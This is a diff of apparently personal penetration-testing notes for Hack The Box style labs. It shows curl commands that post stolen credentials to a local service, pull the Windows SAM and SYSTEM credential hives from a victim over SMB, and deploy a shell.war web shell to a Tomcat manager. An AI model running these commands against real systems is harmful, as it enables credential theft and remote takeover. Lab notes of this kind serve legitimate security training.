@@ -1389,13 +1389,16 @@ So there was a machine (Openadmin) where a port 52846 was running a webservice w
 But as i didn't had browser as i was on a tty reverse shell, so instead of doing portforwarding and opening it through kali's browser.
 I decided to use Curl
 
-curl -d "username=jimmy&password=n1nj4W4rri0R!" -X POST http://localhost:52846/main.php
-	~It Sends POST data with creds	
+	curl -d "username=jimmy&password=n1nj4W4rri0R!" -X POST http://localhost:52846/main.php
+		~It Sends POST data with creds	
 
 
 transfer SAM and SYSTEM file from victim via smb using CURL
 	curl --user "guest"  smb://172.31.1.18/backups/windows/system32/config/SAM --output "SAM"
 	curl --user "guest"  smb://172.31.1.18/backups/windows/system32/config/SYSTEM --output "SYSTEM"
+
+Upload file using CURl
+	curl -u tomcat:'$3cureP4s5w0rd123!' --upload-file shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/lkl&update=true"  
 
 
 ===============
